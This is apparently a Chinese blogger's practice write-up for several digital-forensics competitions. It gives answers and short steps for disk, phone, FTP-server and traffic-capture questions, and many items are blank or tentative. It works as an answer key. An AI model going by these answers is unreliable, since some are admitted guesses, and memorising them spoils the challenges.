<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题目56[填空题] 在阿力士FTP 服务器建设后，有 ___ 个额外用户被加入 (请以阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 个人推测只有这一个额外加入的用户</span><br><span class="line"></span><br><span class="line">![image-20241106113113224](电子数据取证刷题1/image-20241106113113224.png)</span><br><span class="line"></span><br><span class="line">## 题目57. [单选题] 根据阿力士FTP服务器设定显示，此服务器是以___方式连接网络，且是一个___网络状态</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C. 有线 , 公开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ ftp服务器是Docker容器提供服务的，所以主要看Docker和FTP服务器的网络配置</span><br><span class="line"></span><br><span class="line">![image-20241106113956711](电子数据取证刷题1/image-20241106113956711.png)</span><br><span class="line"></span><br><span class="line">## 题目58[填空题] 阿力士FTP 服务器设定最多使用者数目是 ___ (请以阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>docker run -d --name ftpd-server -p 23:21 -p 30010-30019:30010-30019 -e “FTP_PASSIVE_PORTS=30010:30019” -e “FTP_USER_HOME=/home/Dangerous_Project” -e FTP_USER_NAME=alex -e FTP_USER_PASS=123456 -e “PUBLICHOST=218.255.242.114” stilliard/pure-ftpd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题目59[填空题]阿力士FTP服务器使用Docker安装了一个FTP程序为___。(例如 space docker/1.1，请输入spacedocker/1.1，不要输入空格)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>stilliard/pure-ftpd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 也是送分题目</span><br><span class="line"></span><br><span class="line">![image-20241105223228535](电子数据取证刷题1/image-20241105223228535.png)</span><br><span class="line"></span><br><span class="line">## 题目60[多选题] 阿力士FTP 服务器曾使用过甚么版本的Linux内核?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>A. linux-headers-5.11.0-16<br>
D. inux-headers-5.11.0-37</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接在日志解析中可以看到</span><br><span class="line"></span><br><span class="line">![image-20241105223003378](电子数据取证刷题1/image-20241105223003378.png)</span><br><span class="line"></span><br><span class="line">## 题目61[多选题] 阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>B. FAT32<br>
E. Ext4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 也是纯送分题目</span><br><span class="line"></span><br><span class="line">![image-20241105222759203](电子数据取证刷题1/image-20241105222759203.png)</span><br><span class="line"></span><br><span class="line">## 题目62[填空题] 阿力士FTP服务器用户输入了指令 ___ 去检查现存的Docker容器 (例如 netstat lntp，请输入 netstatlntp，不要输入空格)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dockercontainerps-a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 纯送分题</span><br><span class="line"></span><br><span class="line">![image-20241105222641850](电子数据取证刷题1/image-20241105222641850.png)</span><br><span class="line"></span><br><span class="line"># 2022美亚杯个人赛</span><br><span class="line"></span><br><span class="line">## 题目1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2022DIDCTF</span><br><span class="line"></span><br><span class="line">## 介质与手机</span><br><span class="line"></span><br><span class="line">### 题目1请计算计算机的磁盘SHA256值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2B18B049698C725E42BCF9A8ED04B6D206F9473FC5D23571EAEC3F1E1E71BF9E</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接使用美亚取证大师打开该文件</span><br><span class="line"></span><br><span class="line">+ 计算磁盘的`sha256`的值即可</span><br><span class="line"></span><br><span class="line">![image-20241022081846925](电子数据取证刷题1/image-20241022081846925.png)</span><br><span class="line"></span><br><span class="line">### 题目2记录计算机名与开机用户名（格式：计算机名-开机用户名）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>DESKTOP-1R1FP8B-hello</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022082056713](电子数据取证刷题1/image-20241022082056713.png)</span><br><span class="line"></span><br><span class="line">![image-20241022082127049](电子数据取证刷题1/image-20241022082127049.png)</span><br><span class="line"></span><br><span class="line">### 题目3记录计算机操作系统的具体Build版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>18363</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022082210438](电子数据取证刷题1/image-20241022082210438.png)</span><br><span class="line"></span><br><span class="line">### 题目4计算机中后缀名是jpg的缩略图数量为</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>43</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022084135076](电子数据取证刷题1/image-20241022084135076.png)</span><br><span class="line"></span><br><span class="line">### 题目5取证常识题目：计算机系统桌面管理应用相关的记录事件ID为</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>9027</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 题目6记录当前计算机操作系统使用的文件系统格式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>NTFS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接找</span><br><span class="line"></span><br><span class="line">![image-20241022083354132](电子数据取证刷题1/image-20241022083354132.png)</span><br><span class="line"></span><br><span class="line">### 题目7当前计算机操作系统默认的照片查看器为：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>WPS图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022084919512](电子数据取证刷题1/image-20241022084919512.png)</span><br><span class="line"></span><br><span class="line">### 题目8记录计算机Foxmail软件的安装时间</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2020-07-27 12:56:47</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022085616082](电子数据取证刷题1/image-20241022085616082.png)</span><br><span class="line"></span><br><span class="line">### 题目9记录计算机于2020年7月29日最后一次运行navicat时间</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2020-07-29 16:31:22</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022092430172](电子数据取证刷题1/image-20241022092430172.png)</span><br><span class="line"></span><br><span class="line">### 题目10嫌疑人曾用远程工具连接过__台服务器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241022092830777](电子数据取证刷题1/image-20241022092830777.png)</span><br><span class="line"></span><br><span class="line">### 题目11查找计算机中有关手机应用的痕迹，记录APP文件所在路径,无需输入盘符（例：/Program/apk/999.jpg）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>/Users/hello/Downloads/2020001.apk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 找到一个嵌套取证的</span><br><span class="line"></span><br><span class="line">![image-20241106135724872](电子数据取证刷题1/image-20241106135724872.png)</span><br><span class="line"></span><br><span class="line">+ 马上添加为新检材</span><br><span class="line">+ 在下载这边找到</span><br><span class="line"></span><br><span class="line">![image-20241106143933627](电子数据取证刷题1/image-20241106143933627.png)</span><br><span class="line"></span><br><span class="line">### 题目12查找嫌疑人电脑上网站源码最可能的来源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>邮箱获得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241106142138106](电子数据取证刷题1/image-20241106142138106.png)</span><br><span class="line"></span><br><span class="line">### 题目13</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>config.db.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 找到该压缩包后导出压缩包</span><br><span class="line"></span><br><span class="line">![image-20241106144401140](电子数据取证刷题1/image-20241106144401140.png)</span><br><span class="line"></span><br><span class="line">+ 直接找到config目录</span><br><span class="line"></span><br><span class="line">![image-20241106144517403](电子数据取证刷题1/image-20241106144517403.png)</span><br><span class="line"></span><br><span class="line">### 题目14记录手机自动连接过的WIFI名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Xiaomi_6294_5G</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接一把梭</span><br><span class="line"></span><br><span class="line">![image-20241106140217950](电子数据取证刷题1/image-20241106140217950.png)</span><br><span class="line"></span><br><span class="line">### 题目15分析手机数据，请判断微博发送的验证码的短信是否已读，若已读，请写出读取时间</span><br><span class="line"></span><br><span class="line">### 题目17选择手机数据当中，与百度相关的应用名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>手机百度<br>
百度网盘<br>
百度地图</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 百度网盘和手机百度都很好找到，但是百度地图要稍微注意一下</span><br><span class="line"></span><br><span class="line">![image-20241106143328687](电子数据取证刷题1/image-20241106143328687.png)</span><br><span class="line"></span><br><span class="line">### 题目18统计计算机中，5、6月份工资表发放总额为多少元</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 题目19</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>8@qq.com-admin123456</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接一把梭</span><br><span class="line"></span><br><span class="line">![image-20241106143020808](电子数据取证刷题1/image-20241106143020808.png)</span><br><span class="line"></span><br><span class="line">### 题目21找出计算机中WPS的下载网址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://pacakge.cache.wpscdn.cn/wps/download/W.P.S.982801.12012.2019.exe">https://pacakge.cache.wpscdn.cn/wps/download/W.P.S.982801.12012.2019.exe</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20241106140959792](电子数据取证刷题1/image-20241106140959792.png)</span><br><span class="line"></span><br><span class="line">### 题目23暗网登录地址账号密码（格式：地址-账号-密码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###  题目25计算机中是否存在加密容器，其形式为</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>VeraCrypt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 找一下就看到了</span><br><span class="line"></span><br><span class="line">![image-20241106141735676](电子数据取证刷题1/image-20241106141735676.png)</span><br><span class="line"></span><br><span class="line">## 服务器分析</span><br><span class="line"></span><br><span class="line">### 题目33</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>www/wwwroot/fafafa.online</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接查找文件</span><br><span class="line"></span><br><span class="line">![image-20241106150437138](电子数据取证刷题1/image-20241106150437138.png)</span><br><span class="line"></span><br><span class="line">## 流量分析</span><br><span class="line"></span><br><span class="line">### 题目43分析检材1，黑客的IP地址是</span><br><span class="line"></span><br><span class="line">+ 答案：`192.168.94.59`</span><br><span class="line">+ 经过发送包和返回包的分析，得到该ip可能性最大</span><br><span class="line"></span><br><span class="line">![image-20241030082440166](电子数据取证刷题1/image-20241030082440166.png)</span><br><span class="line"></span><br><span class="line">### 题目44</span><br><span class="line"></span><br><span class="line">+ 分析检材1，黑客登录web后台使用的账号是</span><br><span class="line">+ 答案：</span><br><span class="line">+ 确定黑客ip后现在直接将其他ip过滤，同时也要看被攻击主机发给黑客的包，以确定黑客攻击</span><br><span class="line"></span><br><span class="line">![image-20241030083340924](电子数据取证刷题1/image-20241030083340924.png)</span><br><span class="line"></span><br><span class="line">+ </span><br><span class="line"></span><br><span class="line">### 题目45</span><br><span class="line"></span><br><span class="line">### 题目46</span><br><span class="line"></span><br><span class="line"># 2022蓝帽杯半决赛</span><br><span class="line"></span><br><span class="line">## 手机取证</span><br><span class="line"></span><br><span class="line">### 题目1 手机取证_1</span><br><span class="line"></span><br><span class="line">+ iPhone手机的iBoot固件版本号:（答案参考格式：iBoot-1.1.1）</span><br><span class="line">+ 答案：`iBoot-7429.62.1`</span><br><span class="line"></span><br><span class="line">+ 先在该文件目录上找到`Password.txt`，该密码用于火眼取证的时，取证zip解压的文件会出现`请输入iOS备份密码（苹果）:`这个提示词</span><br><span class="line"></span><br><span class="line">![image-20241101160423795](电子数据取证刷题1/image-20241101160423795.png)</span><br><span class="line"></span><br><span class="line">+ 取证后查看该文件就会发现`iBoot`的固件版本号</span><br><span class="line"></span><br><span class="line">![image-20241101160938824](电子数据取证刷题1/image-20241101160938824.png)</span><br><span class="line"></span><br><span class="line">### 题目2 手机取证_2</span><br><span class="line"></span><br><span class="line">+ 该手机制作完备份UTC+8的时间（非提取时间）:（答案参考格式：2000-01-01 00:00:00）</span><br><span class="line">+ 答案：`2022-01-11 18:47:38`</span><br><span class="line">+ 直接分析出来</span><br><span class="line"></span><br><span class="line">![image-20241101161216689](电子数据取证刷题1/image-20241101161216689.png)</span><br><span class="line"></span><br><span class="line">## exe分析</span><br><span class="line"></span><br><span class="line">### 题目3 exe分析_1</span><br><span class="line"></span><br><span class="line">+ 文件services.exe创建可执行文件的路径是:（答案参考格式：C:\Windows.exe）</span><br><span class="line"></span><br><span class="line">+ 答案：</span><br><span class="line">+ 这边就要对受害者的安卓手机进行取证，要取证多镜像文件</span><br><span class="line"></span><br><span class="line">![image-20241101161812984](电子数据取证刷题1/image-20241101161812984.png)</span><br><span class="line"></span><br><span class="line">### 题目4 exe分析_2</span><br><span class="line"></span><br><span class="line">### 题目5 exe分析_3</span><br><span class="line"></span><br><span class="line">### 题目6 exe分析_4</span><br><span class="line"></span><br><span class="line">### 题目7 exe分析_5</span><br><span class="line"></span><br><span class="line">## APK分析</span><br><span class="line"></span><br><span class="line">### 题目8 APK分析_01</span><br><span class="line"></span><br><span class="line">### 题目9 APK分析_02</span><br><span class="line"></span><br><span class="line">### 题目10 APK分析_03</span><br><span class="line"></span><br><span class="line">### 题目11 APK分析_04</span><br><span class="line"></span><br><span class="line">### 题目12 APK分析_05</span><br><span class="line"></span><br><span class="line">### 题目13 APK分析_06</span><br><span class="line"></span><br><span class="line">### 题目14 APK分析_07</span><br><span class="line"></span><br><span class="line">### 题目15 APK分析_08</span><br><span class="line"></span><br><span class="line">### 题目16 APK分析_09</span><br><span class="line"></span><br><span class="line">### 题目17 APK分析_10</span><br><span class="line"></span><br><span class="line">### 题目18 APK分析_11</span><br><span class="line"></span><br><span class="line">### 题目19 APK分析_12</span><br><span class="line"></span><br><span class="line">### 题目20 APK分析_13</span><br><span class="line"></span><br><span class="line">### 题目21 APK分析_14</span><br><span class="line"></span><br><span class="line">### 题目22 APK分析_15</span><br><span class="line"></span><br><span class="line">## 服务器取证</span><br><span class="line"></span><br><span class="line">### 题目23 服务器取证_01</span><br><span class="line"></span><br><span class="line">+ 服务器在启动时设置了运行时间同步脚本，请写出脚本内第二行内容。（答案参考格式：/abcd/tmp [www.windows.com）](http://www.windows.com)/)</span><br><span class="line">+ 答案：</span><br><span class="line"></span><br><span class="line"># 2024精武杯</span><br><span class="line"></span><br><span class="line">## 计算机和手机取证</span><br><span class="line"></span><br><span class="line">### 计算机和手机取证-1</span><br><span class="line"></span><br><span class="line">+ 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</span><br><span class="line">+ 答案：``</span><br><span class="line"></span><br><span class="line"># 2024龙信杯</span><br><span class="line"></span><br><span class="line">## 手机取证</span><br><span class="line"></span><br><span class="line">### 手机取证1</span><br><span class="line"></span><br><span class="line">+ 分析手机检材，请问此手机共通过adb连接过几个设备？[标准格式：3]</span><br><span class="line">+ 答案：`2`</span><br><span class="line">+ 我的思路是这样的，但是我的思路是错误的</span><br><span class="line">+ 我直接看到这里有`01`、`02`两个编号就直接填俩个了</span><br><span class="line"></span><br><span class="line">![image-20241101174122577](电子数据取证刷题1/image-20241101174122577.png)</span><br><span class="line"></span><br><span class="line">+ 正确的应该看这边，直接搜索`adb`然后看到有俩个abd的密钥，从而得出结论</span><br><span class="line"></span><br><span class="line">![image-20241101174233978](电子数据取证刷题1/image-20241101174233978.png)</span><br><span class="line"></span><br><span class="line">### 手机取证2</span><br><span class="line"></span><br><span class="line">+ 分析手机检材，机主参加考试的时间是什么时候？[标准格式：2024-06-17]</span><br><span class="line">+ 答案：`2024-08-23`</span><br><span class="line">+ 查看便签即可，这边`8-12`是周一，下周五即为`23`号</span><br><span class="line"></span><br><span class="line">![image-20241101175217020](电子数据取证刷题1/image-20241101175217020.png)</span><br><span class="line"></span><br><span class="line">### 手机取证3</span><br><span class="line"></span><br><span class="line">+ 分析手机检材，请问手机的蓝牙Mac地址是多少？[标准格式：12:12:12:12:12:12]</span><br><span class="line">+ 答案：`48:87:59:76:21:0f`</span><br><span class="line"></span><br><span class="line">+ 这里直接查看蓝牙的相关操作记录，直接可以得出结果</span><br><span class="line"></span><br><span class="line">![image-20241101175451788](电子数据取证刷题1/image-20241101175451788.png)</span><br><span class="line"></span><br><span class="line">### 手机取证4</span><br><span class="line"></span><br><span class="line">+ 分析手机检材，请问压缩包加密软件共加密过几份文件？[标准格式：3]</span><br><span class="line">+ 答案：``</span><br><span class="line">+ </span><br><span class="line"></span><br><span class="line">## 流量取证</span><br><span class="line"></span><br><span class="line">### 题目1</span><br><span class="line"></span><br><span class="line">+ 分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）</span><br><span class="line"></span><br><span class="line"># 2024FIC线上赛</span><br><span class="line"></span><br><span class="line">## 手机部分</span><br><span class="line"></span><br><span class="line">### 手机部分-1</span><br><span class="line"></span><br><span class="line">+ 嫌疑人李某的手机型号是？</span><br><span class="line">+ 答案：`Xiaomi MI 4`</span><br><span class="line"></span><br><span class="line">+ 直接文本搜索`Xiaomi`，直接搜索出来是`Xiaomi MI 4`</span><br><span class="line"></span><br><span class="line">![image-20241101213103909](电子数据取证刷题1/image-20241101213103909.png)</span><br><span class="line"></span><br><span class="line">### 手机部分-2</span><br><span class="line"></span><br><span class="line">+ 嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？</span><br><span class="line">+ 答案：`Xiaomi Pad 6s`</span><br><span class="line"></span><br><span class="line">+ 直接搜索关键字</span><br><span class="line"></span><br><span class="line">![image-20241101213343254](电子数据取证刷题1/image-20241101213343254.png)</span><br><span class="line"></span><br><span class="line">+ 其实在做手机部分3的时候可能也会注意到`Xiaomi Pad 6s`</span><br><span class="line"></span><br><span class="line">![image-20241101213506259](电子数据取证刷题1/image-20241101213506259.png)</span><br><span class="line"></span><br><span class="line">### 手机部分-3</span><br><span class="line"></span><br><span class="line">+ 嫌疑人李某手机开启热点设置的密码是?</span><br><span class="line">+ 答案：`5aada11bc1b5`</span><br><span class="line"></span><br><span class="line">+ 直接查看移动热点记录这边就可以看到了</span><br><span class="line"></span><br><span class="line">![image-20241101213556443](电子数据取证刷题1/image-20241101213556443.png)</span><br><span 